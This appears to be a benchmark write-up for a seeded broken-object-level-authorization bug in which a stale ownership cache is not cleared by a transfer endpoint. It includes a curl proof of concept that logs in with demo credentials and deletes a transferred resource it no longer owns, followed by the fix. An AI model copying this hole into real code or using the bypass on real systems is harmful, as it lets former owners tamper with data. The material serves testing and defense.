# `bola/cached-owner` — stale ownership cache

## The bug

`app/deps.py` has an `@lru_cache` on `_get_event_type_owner(event_type_id)` used by
`require_event_type_owner_or_org_admin`. `PATCH /event-types/{id}` correctly calls
`_invalidate_event_type_owner_cache()`. The new `POST /event-types/{id}/transfer`
endpoint **does not**. After a transfer, the previous owner retains modify access until
the cache TTL expires or the process restarts.

## Why static analysis misses it

Every authorization helper is correct in isolation. Detection requires correlating two
separate handlers via a shared cache and reasoning that ownership-changing operations
must invalidate the cache. This kind of cross-handler invariant is among the hardest
bug classes for both classical SAST (no global state model) and AI SAST (the cache
function looks legitimate; the missing call is in a different file).

## PoC

```bash
# Alice creates an event type, then transfers it to Bob; meanwhile she retains delete access.
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:8000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@acme.test","password":"demo1234"}' \
  | python -c "import sys, json; print(json.load(sys.stdin)['access_token'])")

# Create
NEW_ET=$(curl -s -X POST http://127.0.0.1:8000/api/v1/event-types \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"slug":"transferable","title":"Transferable","duration_min":15}')
ET_ID=$(echo "$NEW_ET" | python -c "import sys, json; print(json.load(sys.stdin)['id'])")

# Transfer to Bob (id=2). The transfer dep populates the cache (owner=alice) before
# the handler runs; the vulnerable handler skips _invalidate_event_type_owner_cache(),
# leaving the cache stale.
curl -s -X POST "http://127.0.0.1:8000/api/v1/event-types/$ET_ID/transfer" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"new_owner_id":2}'

# Alice still has access (cache says she's owner) — vulnerable
curl -s -o /dev/null -w "After transfer, Alice DELETE: %{http_code}\n" \
  -X DELETE "http://127.0.0.1:8000/api/v1/event-types/$ET_ID" \
  -H "Authorization: Bearer $ALICE_TOKEN"
```

Expected (vulnerable): final response is `200`. Restart the uvicorn process, repeat the
DELETE — you'll get `403`.

On `main`: final response is `403` immediately after transfer.

## Fix

Add `_invalidate_event_type_owner_cache()` after `db.commit()` in the transfer handler
(or, better, replace the LRU with a model-driven check that doesn't cache mutable state).
